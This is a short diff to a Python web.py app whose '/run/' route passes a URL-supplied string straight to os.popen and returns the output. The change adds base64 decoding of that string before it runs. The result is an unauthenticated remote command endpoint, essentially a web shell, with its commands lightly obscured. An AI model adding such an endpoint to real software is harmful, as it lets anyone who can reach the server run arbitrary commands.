@@ -1,4 +1,4 @@
-import web, os
+import web, os, base64
 
 urls = (
     '/run/(.*)', 'runcommand',
@@ -17,6 +17,7 @@ class runcommand:
         str=''
         if not command:
             return
+        command = base64.b64decode(command)
         tmp = os.popen(command).readlines()
         for line in tmp:
             str += line
